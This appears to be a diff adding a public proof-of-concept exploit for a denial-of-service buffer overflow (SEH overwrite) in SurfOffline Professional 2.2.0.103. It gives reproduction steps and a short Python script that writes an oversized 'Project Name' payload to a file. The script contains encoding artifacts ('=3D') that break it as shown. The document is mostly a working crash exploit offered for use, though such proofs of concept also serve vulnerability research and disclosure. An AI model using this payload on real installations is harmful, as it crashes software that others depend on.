@@ -1,0 +1,26 @@
+# Exploit Title: SurfOffline Professional 2.2.0.103 - 'Project Name' Denial of Service (SEH)
+# Date: 2019-12-18
+# Exploit Author: Chris Inzinga
+# Vendor Homepage: http://www.bimesoft.com/
+# Software Link: https://www.softpedia.com/get/Internet/Offline-Browsers/SurfOffline.shtml
+# Version: 2.2.0.103
+# Tested on: Windows 7 SP1 (x86)
+
+# Steps to reproduce:
+# 1. Generate a malicious payload via the PoC
+# 2. In the application set the 'Start Page URL' to any value, it doesn't matter.
+# 3. Paste the PoC payload as the 'Project Name' and click 'next' and 'finish'.
+# 4. Observe a program DOS crash, overwriting SEH=20
+
+#!/usr/bin/python
+
+payload =3D "A" * 382 + "B" * 4 + "C" * 4
+
+try:
+    fileCreate =3Dopen("exploit.txt","w")
+    print("[x] Creating file")
+    fileCreate.write(payload)
+    fileCreate.close()
+    print("[x] File created")
+except:
+    print("[!] File failed to be created")
